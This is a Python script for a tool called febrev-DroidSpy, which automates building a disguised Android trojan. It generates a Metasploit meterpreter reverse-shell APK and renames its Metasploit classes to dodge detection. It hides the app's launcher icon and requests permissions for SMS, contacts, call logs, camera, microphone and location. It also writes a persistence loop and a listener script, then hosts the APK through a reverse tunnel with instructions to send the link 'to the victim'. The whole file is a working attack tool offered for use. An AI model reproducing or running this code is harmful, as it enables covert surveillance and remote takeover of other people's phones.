import os
import click
import socket
import random
import sys
os.system("clear")
prev=os.path.exists("febrev")
os.system("ping -c 1 8.8.8.8 > internet.log")
netinfo=open("internet.log","r")
inet=netinfo.read()
netinfo.close()
if "Unreachable" in inet or "Timed Out" in inet:
	os.system("rm internet.log")
	print("IT SEEMS LIKE INTERNET IS NOT PROPERLY CONNECTED....EXITING!!")
	exit()
else:
	pass
if prev==True:
	os.system("rm -r febrev")
	os.system("rm -r trojans")
else:
	pass
print("""\033[1;32m
   ▄████████    ▄████████ ▀█████████▄     ▄████████    ▄████████  ▄█    █▄   ▄█    █▄     ▄████████ ███▄▄▄▄    ▄██████▄    ▄▄▄▄███▄▄▄▄   
  ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ ███    ███ ███    ███   ███    ███ ███▀▀▀██▄ ███    ███ ▄██▀▀▀███▀▀▀██▄ 
  ███    █▀    ███    █▀    ███    ███   ███    ███   ███    █▀  ███    ███ ███    ███   ███    █▀  ███   ███ ███    ███ ███   ███   ███ 
 ▄███▄▄▄      ▄███▄▄▄      ▄███▄▄▄██▀   ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███ ███    ███  ▄███▄▄▄     ███   ███ ███    ███ ███   ███   ███ 
▀▀███▀▀▀     ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███ ███    ███ ▀▀███▀▀▀     ███   ███ ███    ███ ███   ███   ███ 
  ███          ███    █▄    ███    ██▄ ▀███████████   ███    █▄  ███    ███ ███    ███   ███    █▄  ███   ███ ███    ███ ███   ███   ███ 
  ███          ███    ███   ███    ███   ███    ███   ███    ███ ███    ███ ███    ███   ███    ███ ███   ███ ███    ███ ███   ███   ███ 
  ███          ██████████ ▄█████████▀    ███    ███   ██████████  ▀██████▀   ▀██████▀    ██████████  ▀█   █▀   ▀██████▀   ▀█   ███   █▀  
                                         ███    ███                                                                                      
           =====>3.0 febrev-DroidSpy1.0      --coded by FEBIN \033[1;32m """)
def droid_venom():
	os.system("service postgresql start")
	app=['febrev','app','cache','system2','api','core','mod','katana']
	app_choice=random.choice(app)
	activity=['mainApp','start','begin']
	activity_choice=random.choice(activity)
	print("""
 +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
 |k|r|a|m|p|u|s|6|6|6| |d|r|o|i|d|s|p|y|
 +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
	""")
	os.system("espeak FEBREV-DROIDSPY is the advanced version of febrev-venom tool which creates fake apk with custom icon and name by the user and can be controlled by msf meterpreter")
	os.system(f'zenity --title FEBREV-DROIDSPY --info --text "FEBREV-DROIDSPY is tool which creates fake apk with custom icon and name by the user and can be controlled by msf meterpreter"')
	os.system(f'zenity --title FEBREV-DROIDSPY --entry --text "Enter the name of your apk" --entry-text=krampus666 > name.txt')
	namefile=open("name.txt","r")
	name=namefile.read()
	namefile.close()
	lip=socket.gethostbyname(socket.gethostname())
	os.system("espeak 'Hello hacker, please enter the IP address to the connection of payload'")
	os.system(f'zenity --title "FEBREV-DROIDSPY" --entry --text "Enter your Listener Host: your local ip is {socket.gethostbyname(socket.gethostname())}" --entry-text="{lip}" > febrev.log')
	log0=open("febrev.log","r")
	lhost=log0.read()
	log0.close()
	os.system("espeak 'please enter the port fpr the payload'")
	os.system(f'zenity --title "FEBREV-DROIDSPY" --entry --text "Enter your Listener PORT" --entry-text=6666 > febrev.log')
	log1=open("febrev.log","r")
	lport=log1.read()
	log1.close()
	os.system("clear")
	os.system("espeak 'please select the type of payload'")
	print("""\033[1;36m
┌─┐┌─┐┌┐ ┬─┐┌─┐┬  ┬  ┌┬┐┬─┐┌─┐┬┌┬┐┌─┐┌─┐┬ ┬
├┤ ├┤ ├┴┐├┬┘├┤ └┐┌┘───││├┬┘│ ││ ││└─┐├─┘└┬┘
└  └─┘└─┘┴└─└─┘ └┘   ─┴┘┴└─└─┘┴─┴┘└─┘┴   ┴ 
SELECT THE PAYLOAD TYPE =>
________________________________________
[1] android/meterpreter/reverse_tcp
[2] android/meterpreter/reverse_http
[3] android/meterpreter/reverse_https
-----------------------------------------
""")
	payload=input("Enter The payload type you want to use :-> ")
	if payload=="1":
		msfp="android/meterpreter/reverse_tcp"
		os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost.strip()} lport={lport.strip()} -a dalvik --platform=android -o febrev.apk")
	elif payload=="2":
		msfp="android/meterpreter/reverse_http"
		os.system(f"msfvenom -p android/meterpreter/reverse_http lhost={lhost.strip()} lport={lport.strip()} -a dalvik --platform=android -o febrev.apk")
	elif payload=="3":
		msfp="android/meterpreter/reverse_https"
		os.system(f"msfvenom -p android/meterpreter/reverse_https lhost={lhost.strip()} lport={lport.strip()} -a dalvik --platform=android -o febrev.apk")
	else:
		print("YOU HAVE ENTERED AN INVALID INPUT..So Using Default [1] android/meterpreter/reverse_tcp")
		os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} -a dalvik --platform=android -o febrev.apk")
	os.system("espeak 'please select the icon for the trojan'")
	print("\n SELECT THE ICON FILE [must be in .png format]")
	os.system('zenity --title "SELECT THE ICON FOR THE APK :" --file-selection > febrev.log')
	log3=open("febrev.log","r")
	iconpath=log3.read()
	log3.close()
	
	os.system("java -jar apktool.jar d -f febrev.apk -o febrev > /dev/null")
	os.remove("febrev.apk")
	os.remove("febrev.log")
	
	os.system("mv febrev/smali/com/metasploit febrev/smali/com/android")
	os.system(f"mv febrev/smali/com/android/stage febrev/smali/com/android/krampus")
	os.system(f"mv febrev/smali/com/android/krampus/Payload.smali febrev/smali/com/android/krampus/febrev.smali")
	os.makedirs("febrev/res/drawable")
	os.makedirs("trojans")
	os.system(f"cp {iconpath.strip()} febrev/res/drawable/icon.png")
	os.system("cp fr.png febrev/res/drawable/invisible.png ")
	string=open("febrev/res/values/strings.xml","w+")
	string.write(f'''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{name.strip()}</string>
    <string name="installed"> </string>
</resources>''')
	string.close()
	
	drawable=open("febrev/res/values/public.xml","w+")
	drawable.write('''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="app_name" id="0x7f020000" />
    <public type="drawable" name="icon" id="0x7f030000" />
    <public type="drawable" name="invisible" id="0x7f030001" />
</resources>''')
	drawable.close()
	print("""
SELECT THE APPROPRIATE PERMISSIONS FOR THE PAYLOAD ACCORDING TO THE USE
[1] Read only contacts,calllogs,sms
[2] Read & Write contacts,calllogs,sms
[3] Access Camera,microphone
[4] ALL PERMISSIONS

""")
	permissions=input("ENTER THE CHOICE ,for which kinds of permissions to access : ")
	if permissions==1:
		manifest_file=open("febrev/AndroidManifest.xml","r+")
		manifest=f'''<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.krampus" platformBuildVersionCode="10" platformBuildVersionName="2.3.3">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <application android:label="@string/app_name" android:icon="@drawable/icon">
        <activity android:label="@string/installed" android:icon="@drawable/invisible" android:name=".MainActivity" android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <data android:host="my_host" android:scheme="android"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <action android:name="android.intent.action.VIEW"/>
            </intent-filter>
        </activity>
        <receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name=".MainService"/>
    </application>
</manifest>'''
		manifest_data=manifest_file.write(manifest)
		manifest_file.close()
	elif permissions==2:
		manifest_file=open("febrev/AndroidManifest.xml","r+")
		manifest=f'''<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.krampus" platformBuildVersionCode="10" platformBuildVersionName="2.3.3">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <application android:label="@string/app_name" android:icon="@drawable/icon">
        <activity android:label="@string/installed" android:icon="@drawable/invisible" android:name=".MainActivity" android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <data android:host="my_host" android:scheme="android"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <action android:name="android.intent.action.VIEW"/>
            </intent-filter>
        </activity>
        <receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name=".MainService"/>
    </application>
</manifest>'''
		manifest_file.write(manifest)
		manifest_file.close()
	elif permissions==3:
		manifest_file=open("febrev/AndroidManifest.xml","r+")
		manifest='''<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.krampus" platformBuildVersionCode="10" platformBuildVersionName="2.3.3">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-feature android:name="android.hardware.microphone"/>
    <application android:label="@string/app_name" android:icon="@drawable/icon">
        <activity android:label="@string/installed" android:icon="@drawable/invisible" android:name=".MainActivity" android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <data android:host="my_host" android:scheme="android"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <action android:name="android.intent.action.VIEW"/>
            </intent-filter>
        </activity>
        <receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name=".MainService"/>
    </application>
</manifest>'''
		manifest_file.write(manifest)
		manifest_file.close()

	else:
		manifest_file=open("febrev/AndroidManifest.xml","r+")
		manifest='''<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.krampus" platformBuildVersionCode="10" platformBuildVersionName="2.3.3">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-feature android:name="android.hardware.microphone"/>
    <application android:label="@string/app_name" android:icon="@drawable/icon">
        <activity android:label="@string/app_name" android:icon="@drawable/invisible" android:name=".MainActivity" android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <data android:host="my_host" android:scheme="android"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <action android:name="android.intent.action.VIEW"/>
            </intent-filter>
        </activity>
        <receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name=".MainService"/>
    </application>
</manifest>'''
		manifest_file.write(manifest)
		manifest_file.close()
	os.system(f"sed -i s/Payload/febrev/g febrev/smali/com/android/krampus/*")
	os.system(f"sed -i s/metasploit/android/g febrev/smali/com/android/krampus/*")
	os.system(f"sed -i s/stage/krampus/g febrev/smali/com/android/krampus/*")
	os.system(f"java -jar apktool.jar b -f febrev -o {name.strip()}.apk > /dev/null | echo 'building apk'")
	os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {name.strip()}.apk | echo 'SIGNING APK '")
	os.system(f"mv {name.strip()}.apk trojans/")
	persistence=open("persistence.sh","w+")
	script=f'''while :
do am start --user 0 -a android.intent.action.MAIN -n com.android.krampus/.MainActivity
sleep 10
done'''
	persistence.write(script)
	os.system("clear")
	resource=open(f"{name.strip()}_listener.rc","w+")
	rc=f'''use exploit/multi/handler
set payload {msfp}
set lhost {lhost}
set lport {lport}
set AutoRunScript upload.rc'''
	resource.write(rc)
	resource.close()
	os.system("service apache2 start")
	os.system(f"cp trojans/{name.strip()}.apk /var/www/html/")
	print(f"""\033[1;31m 
resource script for metasploit handler is created in the current directory
______________________________________________________________________________________________________________________
use this command in another terminal to activate listener to your trojan ===> msfconsole -r {name.strip()}_listener.rc 
----------------------------------------------------------------------------------------------------------------------""")
	print("""\033[1;33m
┌─┐┌─┐┌┐ ┬─┐┌─┐┬  ┬  ┌┬┐┬─┐┌─┐┬┌┬┐┌─┐┌─┐┬ ┬
├┤ ├┤ ├┴┐├┬┘├┤ └┐┌┘───││├┬┘│ ││ ││└─┐├─┘└┬┘
└  └─┘└─┘┴└─└─┘ └┘   ─┴┘┴└─└─┘┴─┴┘└─┘┴   ┴ 
 """)
	os.system("espeak 'send the below URL in the following format to the victim, do not close the program until trojan delivery'")
	print(f"\033[1;31m send the below URL to the victim in this format : https://<url>/{name.strip()}.apk \033[1;36m ")
	os.system("ssh -R 80:localhost:80 localhost.run ")



if __name__=="__main__":
	try:
		droid_venom()
	except KeyboardInterrupt:
		os.removedirs("febrev")
		os.system("service postgresql stop")
		os.system("service apache2 stop")
		os.system(f"rm /var/www/html/{name.strip()}.apk")
		print("USER INTERRUPT DETECTED\n BYE BYE HAPPY HACKING")
		sys.exit(0)

